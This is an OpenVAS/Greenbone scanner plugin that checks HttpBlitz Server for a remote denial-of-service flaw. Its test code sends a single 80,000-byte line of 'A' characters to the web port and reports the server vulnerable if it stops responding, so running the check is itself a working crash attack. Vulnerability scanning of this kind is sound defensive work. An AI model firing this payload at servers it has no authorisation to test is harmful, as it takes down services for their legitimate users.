if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100949" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-01-03 14:40:34 +0100 (Mon, 03 Jan 2011)" );
	script_bugtraq_id( 45573 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "HttpBlitz Server HTTP Request Remote Denial of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_family( "Denial of Service" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_require_ports( "Services/www", 7777 );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/45573" );
	script_tag( name: "summary", value: "HttpBlitz Server is prone to a remote denial-of-service vulnerability." );
	script_tag( name: "impact", value: "Attackers can exploit this issue to cause the application to crash,
  denying service to legitimate users." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 7777 );
banner = http_get_remote_headers( port: port );
if(!banner || ContainsString( banner, "Server:" )){
	exit( 0 );
}
if(http_is_dead( port: port, retry: 4 )){
	exit( 0 );
}
if(!soc = open_sock_tcp( port )){
	exit( 0 );
}
ex = crap( data: raw_string( 0x41 ), length: 80000 );
send( socket: soc, data: NASLString( ex, "\\r\\n" ) );
sleep( 2 );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

